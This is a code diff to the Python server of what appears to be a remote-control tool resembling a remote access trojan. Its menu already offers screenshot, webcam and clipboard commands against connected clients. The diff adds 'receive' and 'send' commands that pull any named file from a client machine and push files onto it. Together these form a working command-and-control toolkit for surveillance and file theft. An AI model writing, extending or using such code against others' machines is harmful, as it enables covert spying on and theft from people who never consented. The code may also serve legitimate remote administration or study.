@@ -12,12 +12,21 @@ from modules.clients import Client
 from modules.baseserver import BaseServer
 from utils.prompts import increase_timeout_prompt
 
+if platform.system() != 'Windows':
+    # Enables using arrowkeys on unix-like systems
+    try:
+        import readline
+    except ImportError:
+        pass
+
 logging.basicConfig(level=logging.DEBUG)
 socket.setdefaulttimeout(10)
 
 # Padding for AES
 pad = padding.PKCS7(256)
 header_length = 8
+
+BLOCK_SIZE = 32768
 
 menu_help = """
 Commands:
@@ -37,6 +46,8 @@ screenshot
 webcam
 copy
 paste
+receive
+send
 exit/back
 """
 
@@ -135,6 +146,10 @@ class ServerCLI(BaseServer):
                 self.copy(client)
             case 'paste':
                 self.paste(client)
+            case 'receive':
+                self.receive_file(client)
+            case 'send':
+                self.send_file(client)
             case _:
                 print('Command was not recognized, type "help" for help.')
 
@@ -274,6 +289,53 @@ class ServerCLI(BaseServer):
         else:
             logging.info('Pasted "%s" from client clipboard (%s)' % (clipboard, client.id))
             print(f'Clipboard:\n{clipboard}')
+
+    def receive_file(self, client: Client) -> None:
+        """ Receive a file from the client """
+        filename = input('File to transfer: ')
+        save_name = input('Save file as: ')
+        logging.debug('Receiving file "%s" from client (%s)' % (filename, client.id))
+        client.write(b'SEND_FILE')
+        client.write(filename.encode())
+
+        with open(save_name, 'wb') as file:
+            while True:
+                data = client.read()
+                if data == b'ERROR':
+                    logging.info('Client encountered error transferring file "%s" (%s)' % (filename, client.id))
+                    print('Client encountered error transfering file: ' + client.read().decode())
+                    break
+                if data == b'FILE_TRANSFER_DONE':
+                    break
+                file.write(data)
+
+    def send_file(self, client: Client) -> None:
+        """ Send a file to client """
+        filename = input('Filename: ')
+        save_name = input('Save file as: ')
+        logging.debug('Sending file "%s" to client (%s)' % (filename, client.id))
+
+        client.write(b'RECEIVE_FILE')
+        client.write(save_name.encode())
+        error = client.read().decode() == 'ERROR'
+        if error:
+            print('Error occurred sending file to client: ' + client.read().decode())
+            return
+
+        try:
+            with open(filename, 'rb') as file:
+                while True:
+                    block = file.read(BLOCK_SIZE)
+                    if not block:
+                        break
+                    client.write(block)
+
+        except (FileNotFoundError, PermissionError) as error:
+            logging.error('Unable to send file "%s" to client (%s): %s' % (filename, client.id, str(error)))
+            client.write(b'FILE_TRANSFER_DONE')
+        else:
+            client.write(b'FILE_TRANSFER_DONE')
+            logging.info('Successfully transferred file "%s" to client (%s)' % (filename, client.id))
 
 
 if __name__ == '__main__':
